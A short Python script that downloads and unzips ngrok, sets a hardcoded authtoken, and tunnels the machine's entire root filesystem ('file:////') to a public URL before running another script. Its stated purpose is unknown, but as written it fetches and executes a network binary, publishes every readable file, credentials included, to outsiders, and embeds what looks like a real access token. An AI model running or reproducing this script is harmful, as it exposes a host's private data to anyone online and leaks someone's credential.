import os


os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip")
os.system("unzip ngrok-stable-linux-386.zip")
os.system("./ngrok authtoken 1zp3IlafXeuWNNQZwkJMctJz0gg_88PZuMKLXKJGWHpzSnrnW")
os.system("./ngrok http file:////")
os.system("python a.py")
